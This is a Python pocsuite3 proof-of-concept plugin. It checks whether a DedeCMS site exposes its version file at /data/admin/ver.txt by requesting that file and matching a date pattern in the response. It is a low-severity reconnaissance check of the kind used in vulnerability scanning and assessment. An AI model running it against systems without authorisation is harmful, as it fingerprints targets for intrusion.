#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import re


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''DedeCMS_version_info-disclosure'''
    desc = ''''''
    solution = ''''''
    severity = '''low'''
    vulType = '''info-disclosure'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''dedecms'''
    appVersion = ''''''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        verify_url = make_verify_url(self.url, "/data/admin/ver.txt", mod=0)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
        }
        response = requests.get(verify_url, headers=headers, verify=False, timeout=15)
        re_obj = re.compile(b"^20\d{2}[0-1]\d[0-3]\d$", re.IGNORECASE)
        m = re.search(re_obj, response.content)
        if response.status_code == 200 and m:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = response.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
